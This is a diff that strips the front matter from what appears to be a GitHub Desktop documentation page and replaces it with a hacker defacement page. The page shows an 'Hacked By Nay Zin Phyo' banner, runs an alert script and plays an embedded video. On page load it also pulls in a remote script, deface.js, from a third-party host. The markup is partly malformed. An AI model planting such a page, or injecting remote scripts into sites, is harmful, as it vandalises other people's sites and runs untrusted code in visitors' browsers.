@@ -1,14 +1,33 @@
----
-title: Installing and configuring GitHub Desktop
-shortTitle: Installing and configuring
-intro: 'Get {% data variables.product.prodname_desktop %} set up to manage your project work. Authenticate to {% data variables.product.prodname_dotcom_the_website %} or {% data variables.product.prodname_enterprise %}, keep the app up-to-date, and review your preferred settings.'
-redirect_from:
-  - /desktop/getting-started-with-github-desktop
-versions:
-  fpt: '*'
-children:
-  - /overview
-  - /installing-and-authenticating-to-github-desktop
-  - /configuring-and-customizing-github-desktop
----
 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+				<meta charset="UTF-8">
+				<title>Hacked By NaY Zi</title>
+</head>
+<script>alert("Hacked")</script>
+<style>
+				body{
+								background-color:red;
+								
+				}
+				p{
+								color: Yellow;
+								
+				}
+				h1 {
+								color:darkblue;
+				}
+				
+				}
+</style>
+<script type="text/javascript" src="http://yourjavascript.com/82298220141/deface.js "> </script>
+
+<body>
+				<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcStxHfMJ_6x0MRzfVFGenPaoCZM25pmEOrSDg&usqp=CAU#7f97fe" alt="Nay Zin Phyo">
+   <canter><h1>Hacked By Nay Zin Phyo</h1></canter>
+   <marquee><p>System doesn't Safe</p></marquee>
+   <marquee><h3></h3>Update The System</marquee>
+   <iframe width="92" height="54" <audio><iframe width="932" height="524" src="https://www.youtube.com/embed/d4mapWRK9AI" title="YouTube video player" frameborder="3"src="https://www.youtube.com/embed/d4mapWRK9AI" title="YouTube video player" frameborder="2" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+</body>
+</html>
